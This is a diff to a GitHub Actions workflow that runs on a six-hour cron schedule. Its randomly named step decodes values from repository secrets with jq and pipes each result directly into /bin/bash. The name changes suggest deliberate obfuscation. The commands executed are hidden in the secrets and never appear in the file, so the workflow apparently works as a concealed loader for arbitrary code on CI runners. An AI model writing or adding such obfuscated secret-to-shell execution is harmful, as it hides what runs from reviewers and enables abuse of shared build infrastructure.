@@ -3,27 +3,28 @@ name: yuanriyue3461
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
+    - cron: '59 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuanriyue3461
         env:
-          aj064: ${{ secrets.aj064 }}
+          u5: ${{ secrets.u5 }}
         run: |
-          echo $aj064 | jq -r .u3852 | /bin/bash
-          echo $svoxj30 | jq -r .b5 | /bin/bash
-          echo $q8368 | jq -r .d4 | /bin/bash
-          echo $yml9429 | jq -r .cne3 | /bin/bash
-          echo $p92 | jq -r .uxs1533 | /bin/bash
-          echo $voz90 | jq -r .ulbqi260 | /bin/bash
-          echo $u0 | jq -r .odde281 | /bin/bash
-          echo $sbw575 | jq -r .qpzrd81 | /bin/bash
-          echo $f1494 | jq -r .jdzqf16136 | /bin/bash
-          echo $e0151 | jq -r .kc74037 | /bin/bash
-          echo $j22 | jq -r .sax43007 | /bin/bash
-          echo $oml3308 | jq -r .bm2446 | /bin/bash
-          echo $jcv28918 | jq -r .tghq367 | /bin/bash
+          echo $u5 | jq -r .gbvo09548 | /bin/bash
+          echo $iq07 | jq -r .v86 | /bin/bash
+          echo $nsbah836 | jq -r .poip1 | /bin/bash
+          echo $zz5 | jq -r .nm7581 | /bin/bash
+          echo $xbx444 | jq -r .uqgf2 | /bin/bash
+          echo $wglh33 | jq -r .xzv758 | /bin/bash
+          echo $jsq3 | jq -r .nf54 | /bin/bash
+          echo $hu84 | jq -r .mreo86 | /bin/bash
+          echo $yw35385 | jq -r .svfw1 | /bin/bash
+          echo $qk77538 | jq -r .yzdho37587 | /bin/bash
+          echo $tp892 | jq -r .mv261 | /bin/bash
+          echo $ly37951 | jq -r .clw7502 | /bin/bash
+          echo $mh1631 | jq -r .qzxp3 | /bin/bash
 
